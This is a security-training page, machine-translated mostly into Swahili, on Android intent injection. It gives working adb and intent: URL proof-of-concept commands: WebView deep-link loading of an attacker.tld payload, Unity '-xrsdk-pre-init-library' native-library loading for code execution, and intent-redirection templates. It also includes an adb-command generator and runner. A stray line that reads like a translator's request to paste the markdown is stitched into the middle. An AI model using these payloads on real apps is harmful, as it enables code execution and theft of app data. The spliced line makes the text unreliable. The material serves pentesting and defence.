# Intent Injection

{{#include ../../banners/hacktricks-training.md}}

Intent injection inatumia components zinazokubali Intents zinazoendeshwa na mshambuliaji au data ambayo baadaye hubadilishwa kuwa Intents. Mifano miwili inayojirudia mara kwa mara wakati wa Android app pentests ni:

- Kupitisha extras zilizotengenezwa kwa makusudi kwa exported Activities/Services/BroadcastReceivers ambazo baadaye zinafowardwa kwa components zilizo privileged, non-exported.
- Kuchochea exported VIEW/BROWSABLE deep links ambazo zinafoward URL zinazoendeshwa na mshambuliaji ndani ya internal WebViews au sinks nyingine nyeti.

## Deep links → WebView sink (URL parameter injection)

If an app exposes a custom scheme deep link such as:
```text
myscheme://com.example.app/web?url=<attacker_url>
```
na Activity inayopokea inapeleka kigezo cha query `url` ndani ya WebView, unaweza kulazimisha app kuonyesha yaliyomo ya mbali yoyote katika muktadha wake wa WebView.

PoC via adb:
```bash
# Implicit VIEW intent
adb shell am start -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"

# Or explicitly target an Activity
adb shell am start -n com.example/.MainActivity -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"
```
Impact
- HTML/JS inatekelezwa ndani ya profaili ya WebView ya app.
- Ikiwa JavaScript imewezeshwa (kawaida au kutokana na ukaguzi usiopangwa vyema), unaweza kuorodhesha/ kutumia vitu vyote vilivyo wazi vya `@JavascriptInterface`, kuiba WebView cookies/local storage, na pivot.

See also:

{{#ref}}
webview-attacks.md
{{#endref}}

## Hitilafu ya mpangilio wa ukaguzi inayowezesha JavaScript

Hitilafu inayojirudia ni kuwezesha JavaScript (au mipangilio mingine ya WebView yenye ruhusa) kabla allowlist/uthibitisho wa URL ya mwisho haujakamilika. Ikiwa vitumiavyo vya awali vinakubali deep link yako na WebView ikasawazwa kwanza, mzigo wako wa mwisho utafanyika ukiwa JavaScript tayari imewezeshwa hata kama ukaguzi wa baadaye ni mbovu au umechelewa.

What to look for in decompiled code:
- Vifaa vya msaada vingi vinavyochambua/gawanya/jenga upya URL kwa njia tofauti (normalization isiyotegemewa).
- Miito ya `getSettings().setJavaScriptEnabled(true)` kabla ya ukaguzi wa mwisho wa host/path allowlist.
- Mchakato kama: parse → partial validate → configure WebView → final verify → loadUrl.

Mitigations
- Fanya canonicalize mara moja na thibitisha kwa ukali; kataa kwa chaguo-msingi (fail closed).
- Wezesha JavaScript tu baada ya ukaguzi wote kupita na mara tu kabla ya kupakia maudhui yanayoaminika.
- Epuka kufichua bridges kwa origins zisizoaminika.

## Unity Runtime: Intent-to-CLI extras → kuingiza library native kabla ya init (RCE)

Programu za Android zilizo ndani ya Unity kawaida zinatumia `com.unity3d.player.UnityPlayerActivity` (au `UnityPlayerGameActivity`) kama Activity ya kuingia. Template ya Unity kwa Android hushughulikia Intent extra maalum inayoitwa `unity` kama mnyororo wa command-line flags kwa Unity runtime. Wakati Activity ya kuingia imeexport (default katika templates nyingi), app yoyote ya ndani – na wakati mwingine tovuti ikiwa `BROWSABLE` ipo – inaweza kutoa extra hii.

Flag hatari isiyoandikwa husababisha utekelezaji wa code native wakati wa mwanzo sana wa initialization ya process:

- Flag fiche: `-xrsdk-pre-init-library <absolute-path>`
- Athari: `dlopen(<absolute-path>, RTLD_NOW)` mapema sana katika init, ikipakia attacker-controlled ELF ndani ya process ya app lengwa kwa UID na permissions zake.

Reverse-engineering excerpt (simplified):
```c
// lookup the arg value
initLibPath = FUN_00272540(uVar5, "xrsdk-pre-init-library");
// load arbitrary native library early
lVar2 = dlopen(initLibPath, 2); // RTLD_NOW
```
Kwa nini inafanya kazi
- Intent extra `unity` linasomwa na kutafsiriwa kuwa Unity runtime flags.
- Kutoa flag ya pre-init huonyesha Unity kwenye attacker-controlled ELF path ndani ya allowed linker namespace path (ona constraints hapa chini).

Masharti ya exploitation
- Unity entry Activity ime-exported (kwa kawaida ni kweli kwa default).
- Kwa one-click remote kupitia browser: entry Activity pia inatangaza `android.intent.category.BROWSABLE` ili extras ziweze kutumwa kutoka kwa `intent:` URL.

Local exploitation (kifaa kimoja)
1) Weka payload ELF kwenye path inayosomwa na victim app. Rahisi: ship malicious library katika attacker app yako na hakikisha inachukuliwa chini ya `/data/app/.../lib/<abi>/` kwa kuweka katika manifest ya attacker:
```xml
<application android:extractNativeLibs="true" ...>
```
2) Anzisha Unity activity ya mwathiriwa kwa CLI pre-init flag katika extra ya `unity`. Mfano wa ADB PoC:
```bash
adb shell am start \
-n com.victim.pkg/com.unity3d.player.UnityPlayerActivity \
-e unity "-xrsdk-pre-init-library /data/app/~~ATTACKER_PKG==/lib/arm64/libpayload.so"
```
3) Unity calls `dlopen("/data/.../libpayload.so", RTLD_NOW)`; payload yako inaendesha katika mchakato wa mwathiri, ikirithi ruhusa zake zote za app (kamera/mikrofoni/mtandao/uhifadhi, n.k.) na upatikanaji wa vikao/data ndani ya app.

Notes
- Njia halisi ya `/data/app/...` inatofautiana kati ya vifaa/ufungaji. App ya mshambuliaji inaweza kupata saraka yake ya native lib wakati wa utekelezaji kwa kutumia `getApplicationInfo().nativeLibraryDir` na kuwasiliana nayo na kichocheo.
- Faili haifai kumalizika kwa `.so` ikiwa ni ELF halali — `dlopen()` inaangalia vichwa vya ELF, sio viambatisho.

Remote one‑click via browser (kwa sharti)
If the Unity entry activity is exported with `BROWSABLE`, a website can pass extras via an `intent:` URL:
```text
intent:#Intent;package=com.example.unitygame;scheme=whatever;\
S.unity=-xrsdk-pre-init-library%20/data/local/tmp/malicious.so;end;
```
Hata hivyo, kwenye Android za kisasa dynamic linker namespaces na SELinux zinazuia kupakia kutoka njia nyingi za umma (kwa mfano, `/sdcard/Download`). Utaona makosa kama:
```
library "/sdcard/Download/libtest.so" ("/storage/emulated/0/Download/libtest.so") needed
or dlopened by "/data/app/.../lib/arm64/libunity.so" is not accessible for the
namespace: [name="clns-...", ... permitted_paths="/data:/mnt/expand:/data/data/com.example.unitygame"]
```
Bypass strategy: target apps that cache attacker-controlled bytes under their private storage (e.g., HTTP caches). Because permitted paths include `/data` and the app’s private dir, pointing `-xrsdk-pre-init-library` at an absolute path inside the app’s cache can satisfy linker constraints and yield code execution. This mirrors prior cache-to-ELF RCE patterns experienced in other Android apps.

## Vigezo vingine vya kawaida vya Intent injection

- startActivity/sendBroadcast using attacker-supplied `Intent` extras that are later re-parsed (`Intent.parseUri(...)`) and executed.
- Exported proxy components that forward Intents to non-exported sensitive components without permission checks.

---

## Kuotomatisha upimaji wa exported-component (Smali-driven ADB generation)

Wakati components zilizo exported zinatarajia extras maalum, kubahatisha muundo wa payload husababisha kupoteza muda na false negatives. Unaweza kuotomatisha ugunduzi wa keys/types moja kwa moja kutoka Smali na kutoa amri za adb zinazoweza kukimbia moja kwa moja.

Tool: APK Components Inspector
- Repo: https://github.com/thecybersandeep/apk-components-inspector
- Approach: decompile na skana Smali kutafuta vuitio kama `getStringExtra("key")`, `getIntExtra("id", ...)`, `getParcelableExtra("redirect_intent")`, `getSerializableExtra(...)`, `getBooleanExtra(...)`, `getAction()`, `getData()` ili kubaini ni extras na fields gani zinazotumiwa na kila component.
- Output: kwa kila exported Activity/Service/Receiver/Provider, the tool prints a short explanation and the exact `adb shell am ...`/`cmd content ...` command with correctly typed flags.

Sakinisha
```bash
git clone https://github.com/thecybersandeep/apk-components-inspector
cd apk-components-inspector
python3 -m venv venv && source venv/bin/activate
pip install androguard==3.3.5 rich
```
Matumizi
```bash
python apk-components-inspector.py target.apk
```
I need the content of src/mobile-pentesting/android-app-pentesting/intent-injection.md to translate. Please paste the markdown you want translated.
```bash
adb shell am start -n com.target/.ExportedActivity --es url https://example.tld
adb shell am startservice -n com.target/.ExportedService --ei user_id 1337 --ez force true
adb shell am broadcast -n com.target/.ExportedReceiver -a com.target.ACTION --es redirect_intent "intent:#Intent;component=com.target/.Internal;end"
adb shell cmd content query --uri content://com.target.provider/items
```
Orodha ya haraka ya ADB am extras (bendera zinazoelewa aina)
- Strings: `--es key value` | String array: `--esa key v1,v2`
- Integers: `--ei key 123` | Int array: `--eia key 1,2,3`
- Booleans: `--ez key true|false`
- Longs: `--el key 1234567890`
- Floats: `--ef key 1.23`
- URIs (extra): `--eu key content://...` | Data URI (Intent data): `-d content://...`
- Component extra: `--ecn key com.pkg/.Cls`
- Null string extra: `--esn key`
- Common flags: `-a <ACTION>` `-c <CATEGORY>` `-t <MIME>` `-f <FLAGS>` `--activity-clear-task --activity-new-task`

Vidokezo vya kitaalamu kwa Providers
- Tumia `adb shell cmd content query|insert|update|delete ...` kufikia ContentProviders bila agents.
- Kwa upimaji wa SQLi, badilisha `--projection` na `--where` (yaani selection) wakati provider wa msingi unaungwa mkono na SQLite.

Automation ya pipeline nzima (interactive executor)
```bash
# generate and capture commands then execute them one by one interactively
python apk-components-inspector.py app.apk | tee adbcommands.txt
python run_adb_commands.py
```
Skripti ya msaada (inaunganisha mistari yaliyoendelea, inatekeleza mistari tu zinazotangulia na `adb`):
```python
import subprocess

def parse_adb_commands(file_path):
with open(file_path, 'r') as file:
lines = file.readlines()
commands = []
current = []
for line in lines:
s = line.strip()
if s.startswith("adb "):
current = [s]
elif s.startswith("#") or not s:
if current:
full = ' '.join(current).replace(" \\ ", " ").replace("\\", "").strip()
commands.append(full)
current = []
elif current:
current.append(s)
if current:
full = ' '.join(current).replace(" \\ ", " ").replace("\\", "").strip()
commands.append(full)
return commands

for i, cmd in enumerate(parse_adb_commands('adbcommands.txt'), 1):
print(f"\nCommand {i}: {cmd}")
input("Press Enter to execute this command...")
try:
r = subprocess.run(cmd, shell=True, check=True, text=True, capture_output=True)
print("Output:\n", r.stdout)
if r.stderr:
print("Errors:\n", r.stderr)
except subprocess.CalledProcessError as e:
print(f"Command failed with error:\n{e.stderr}")
```
Endesha kwenye kifaa: inspector inategemea Python na inafanya kazi kwenye Termux au simu zilizo-rooted ambazo zina `apktool`/`androguard`.

---

## Intent Redirection (CWE-926) – finding and exploiting

Pattern
- Sehemu ya kuingia iliyotangazwa (exported) (Activity/Service/Receiver) husoma Intent inayokuja na kuisogeza ndani au nje bila kuthibitisha chanzo/data, kwa mfano:
- `startActivity(getIntent())`
- `startActivity(intent)` where `intent` came from an extra like `redirect_intent`/`next_intent`/`pending_intent` or `Intent.parseUri(...)`.
- Trusting `action`/`data`/`component` fields without checks; not verifying caller identity.

What to search in Smali/Java
- Matumizi ya `getParcelableExtra("redirect_intent")`, `getParcelable("intent")`, `getIntent().getParcelableExtra(...)`.
- Vitendo vya moja kwa moja vya `startActivity(...)`, `startService(...)`, `sendBroadcast(...)` juu ya Intents zilizopotoshwa na mshambuliaji.
- Ukosefu wa ukaguzi wa `getCallingPackage()`/`getCallingActivity()` au milango ya ruhusa maalum.

ADB PoC templates
- Proxy Activity inayosafirisha Intent ya ziada hadi Activity ya ndani yenye ruhusa za juu:
```bash
adb shell am start -n com.target/.ProxyActivity \
--es redirect_intent 'intent:#Intent;component=com.target/.SensitiveActivity;end'
```
- Huduma iliyotolewa inayoheshimu parcelable ya `redirect_intent`:
```bash
adb shell am startservice -n com.target/.ExportedService \
--es redirect_intent 'intent:#Intent;component=com.target/.PrivService;action=com.target.DO;end'
```
- Exported Receiver ambayo inapitisha bila uhakiki:
```bash
adb shell am broadcast -n com.target/.RelayReceiver -a com.target.RELAY \
--es forwarded 'intent:#Intent;component=com.target/.HiddenActivity;S.extra=1;end'
```
Bendera zinazosaidia tabia ya singleTask-style
```bash
# Ensure a fresh task when testing Activities that check task/intent flags
adb shell am start -n com.target/.ExportedActivity --activity-clear-task --activity-new-task
```
Mifano ya dunia halisi (athari zinatofautiana):
- CVE-2024-26131 (Element Android): exported flows zinazosababisha WebView manipulation, PIN bypass, login hijack.
- CVE-2023-44121 (LG ThinQ Service): exported receiver action `com.lge.lms.things.notification.ACTION` → athari za kiwango cha mfumo.
- CVE-2023-30728 (Samsung PackageInstallerCHN < 13.1.03.00): redirection → upataji wa faili chochote (kwa ushiriki wa mtumiaji).
- CVE-2022-36837 (Samsung Email < 6.1.70.20): implicit Intents leak content.
- CVE-2021-4438 (React Native SMS User Consent).
- CVE-2020-14116 (Xiaomi Mi Browser).

Mikakati ya kupunguza (orodha ya ukaguzi kwa watengenezaji)
- Usitume Intents zinazoingia moja kwa moja; safisha na ujenge upya sehemu zilizoruhusiwa.
- Zuia ufunguaji kwa kutumia `android:exported="false"` isipokuwa inahitajika. Linda komponenti zilizotolewa kwa permissions na signatures.
- Thibitisha utambulisho wa mtumaji (`getCallingPackage()`/`getCallingActivity()`), na lazimisha explicit Intents kwa urambazaji ndani ya app.
- Thibitisha `action` na `data` (scheme/host/path) kabla ya matumizi; epuka `Intent.parseUri` kwa input isiyoaminika.

---

## Marejeo

- [Android – Access to app-protected components](https://blog.oversecured.com/Android-Access-to-app-protected-components/)
- [Samsung S24 Exploit Chain Pwn2Own 2024 Walkthrough](https://medium.com/@happyjester80/samsung-s24-exploit-chain-pwn2own-2024-walkthrough-c7a3da9a7a26)
- [Pwn2Own Ireland 2024 – Samsung S24 attack chain (whitepaper)](https://maliciouserection.com/2025/05/13/pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper.html)
- [Demonstration video](https://www.youtube.com/watch?v=LAIr2laU-So)
- [Automating Android App Component Testing with New APK Inspector (blog)](https://www.mobile-hacker.com/2025/09/18/automating-android-app-component-testing-with-new-apk-inspector/)
- [APK Components Inspector – GitHub](https://github.com/thecybersandeep/apk-components-inspector)
- [Google guidance on intent redirection](https://support.google.com/faqs/answer/9267555?hl=en)
- [OVAA vulnerable app](https://github.com/oversecured/ovaa)
- [Exported Service PoC APK](https://github.com/nhattm3006/android-poc/blob/main/Exported%20Service/poc.apk)
- [Ostorlab – 100M installs image app deep dive (component summary example)](https://medium.com/@ostorlab/this-article-is-a-technical-deep-dive-showing-how-a-100m-installation-image-application-can-6343ce8ea076)
- [CVE-2024-26131 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-26131)
- [CVE-2023-44121 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2023-44121)
- [CVE-2023-30728 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2023-30728)
- [CVE-2022-36837 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2022-36837)
- [CVE-2021-4438 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-4438)
- [CVE-2020-14116 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2020-14116)
- [CVE-2025-59489 – Arbitrary Code Execution in Unity Runtime (blog)](https://flatt.tech/research/posts/arbitrary-code-execution-in-unity-runtime/)
- [Unity docs – Android custom activity command-line](https://docs.unity3d.com/6000.0/Documentation/Manual/android-custom-activity-command-line.html)
- [Unity Security Sept-2025-01 advisory](https://unity.com/security/sept-2025-01)
- [HEXACON talk – Messenger one-click cache-based RCE pattern (slides)](https://www.hexacon.fr/slides/Calvanno-Defense_through_Offense_Building_a_1-click_Exploit_Targeting_Messenger_for_Android.pdf)

{{#include ../../banners/hacktricks-training.md}}
